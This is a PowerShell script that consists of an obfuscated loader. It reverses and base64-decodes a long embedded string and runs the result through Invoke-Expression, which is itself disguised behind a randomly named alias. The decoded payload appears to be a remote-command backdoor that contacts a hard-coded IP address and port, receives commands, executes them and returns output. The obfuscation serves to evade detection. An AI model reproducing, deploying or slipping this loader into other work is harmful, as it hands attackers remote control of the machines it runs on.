$best64code = "K0QfK0gIfRCI6I3byJXRiACdz9GStUGdpJ3VgACIgoQD7BCajRXYjBSfK0QfgACIgoQDi4CZlxWahZGIu9Wa0NWZu52bDJCI0N3bI1SZ0lmcXBCIgACIgACIK0wegU2csVGI9BCIgAiCNkCKlN3bsNkL05WZpx2YkACIgACIgACIK0QKoU2cvx2Qu0WYlJHdzRCIgACIgACIgoQDpgSZz9GbD5iclRWYlJHJgACIgACIgAiCNkCKlN3bsNkLyVGdpJ3dkACIgACIgACIK0gCN0HIgACIgACIgoQD9BCIgACIgACIgACIgoQDyVGdpJ3dkAiIl5WasRiIgQmbh1WbvNULlxGZuFGSgACIgACIgACIgACIgACIgoQD7BSKioCIE5UQN10TDJCIltWas1CIl5WasRCKgYWalNHblBCIgACIgACIgACIgoQD9BCIgACIgACIgACIgoQDu9WazNXZzBSZoRHIzV2cvx2Yg40TJR1QF5kTPNETgIXZ0ZWYgA3bvxGIlxWaodHIulWYtBCdphXZgMCIgsWYlJnYgACIgACIgACIgACIgACIgoQD9BCIgACIgACIgACIgACIgAiCN0HIgACIgACIgACIgACIgACIgACIgoQDyVGdpJ3dkAiIl5WaMRmbh1WbvNGJiACZuFWbt92QtUGbk5WYIBCIgACIgACIgACIgACIgACIgACIgACIgoQDicSZulGTk5WYt12bjRyJgoDa0l2dgQmbh1WbvNULlxGZuFGSgcmbpxGbhNkIgQ3cvhULlRXaydFIgACIgACIgACIgACIgACIgACIgACIgAiCNsHIpIiKgQkTB1UTPNkIgU2apxWLgUmbpxEZuFWbt92YkgCImlWZzxWZgACIgACIgACIgACIgACIgACIgAiCN0HIgACIgACIgACIgACIgACIgACIgoQDrFWZyJGIgACIgACIgACIgACIgACIgACIgACIgAiCNIiLu9Wa0NWZu52bjByZul2cvx2YgwiTPlEVDVkTO90QMBCZlZXalNWZSJCI0N3bI1SZ0lmcXBCIgACIgACIgACIgACIgACIgACIgACIgoQD7BSKi40TJR1QF5kTPNETiAScl1CIl5WaMRmbh1WbvNGJoAiZpBCIgACIgACIgACIgACIgACIgACIK0gCNISZulGTk5WYt12bjRCI6Qmbh1WbvNGIkVmdpV2YlJlIgQ3cvhULlRXaydFIgACIgACIgACIgACIgACIgACIgoQD9BCIgACIgACIgACIgACIgACIgACIK0wahVmciBCIgACIgACIgACIgACIgACIgACIgACIgoQDi4SZ09WblJHI5JGIkV2cvx2Yg42bpR3Yl5mbvNkIgQ3cvhULlRXaydFIgACIgACIgACIgACIgACIgACIgACIgAiCNsHIpUmbpxEZuFWbt92YkAScl1CIsxWduRCKgYWagACIgACIgACIgACIgACIgACIgAiCNkCKl5WaMRWYlJlLyVGZhVmckASPgUmbpxEZuFWbt92YkACIgACIgACIgACIgACIgACIgACIK0wegkSZ1JHdkgCIlxWaodHIgACIgACIgACIgACIgACIK0AZlZXalNWZyBycpBiIO9USUNURO50TDxkIgwWa05WdgMHZuFWbt92YgI3bmBCdpF2dg8GdgA3bvxGIhBiclRnblBydv5EIjACIgACIgACIgACIgACIgAiCNoQDyVGdpJ3dkAiclRXaydXLgQWZtFWZyR3UzRXY0NVblR3c5NVLk5WZTBCIgACIgACIgACIgACIgAiCNIiLu4yc0FGdzBSblR3c5NHIn5WatFWZyR3UiACdz9GStUGdpJ3VgACIgACIgACIgACIgACIgoQD7BSKiMHdhR3c0V2ZiAScl1CIl5WasRCKgYWagACIgACIgACIgACIK0gCNISZulGbkAiOkVmdpV2YlJlIgQ3cvhULlRXaydFIgACIgACIgACIgAiCNoQD9ByahVmciByegkSZulGbkAScl1CIsxWduRCKgYWagACIgACIgACIgACIK0QKoUmbpxEZhVmUuIXZkFWZyRCI9ASZulGbkACIgACIgACIgACIgoQD7BSKlVnc0RCKgUGbph2dgACIgACIgAiCNoQDiU2ZhN3cl1GJgoDduV2UiACdz9GStUGdpJ3VgACIgACIgAiCNkSZnF2czVWbkgSZulGTlRXaydlLyVGdpJ3dkACIgACIgACIK0gCNUWdyRHJg0DIoNXdsZ0b0VXQuIXZ0lmc3RCIgACIgACIgoQDpgjRUVlO601ZulGZvNmbF5Cd4VGVu0WZ0NXeTtFIs0WYlJHdzRCKyVGZhVmUtFWZyR3Uu8USu0WZ0NXeTBCdjVmai9UL3VmTg0DIyVGZhVmckACIgACI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" ;
$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; $Stripped = -join $base64 ;
$Padded = switch ($Stripped.Length % 4) { 0 { $Stripped }; 1 { $Stripped.Substring(0, $Stripped.Length - 1) }; 2 { $Stripped + ("=" * 2) }; 3 { $Stripped + "=" }} ;
$LoadCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Padded)) ;
$RandomSTR64 = '40bJN1UFJFc4VULlt2TW5Wa'.ToCharArray() ; [array]::Reverse($RandomSTR64) ; $iexbase64 = -join $RandomSTR64 ;
$iexbase64 = switch ($iexbase64.Length % 4) { 0 { $iexbase64 }; 1 { $iexbase64.Substring(0, $iexbase64.Length - 1) }; 2 { $iexbase64 + '=' * 2 }; 3 { $iexbase64 + '=' } } ;
$iexcmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($iexbase64)) ;
$aliasSTR64 = 'gS3c1c'.ToCharArray() ; [array]::Reverse($aliasSTR64) ; $aliasbase = -join $aliasSTR64 ;
$aliasbase = switch ($aliasbase.Length % 4) { 0 { $aliasbase }; 1 { $aliasbase.Substring(0, $aliasbase.Length - 1) }; 2 { $aliasbase + '=' * 2 }; 3 { $aliasbase + '=' } } ;
$aliasFinal = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($aliasbase)) ;
$Null = nEw-alIas -NaMe $alIasfiNAl -VALue $iEXCmd -fORce ; & $ALIASFInAL $loaDcoDE ;
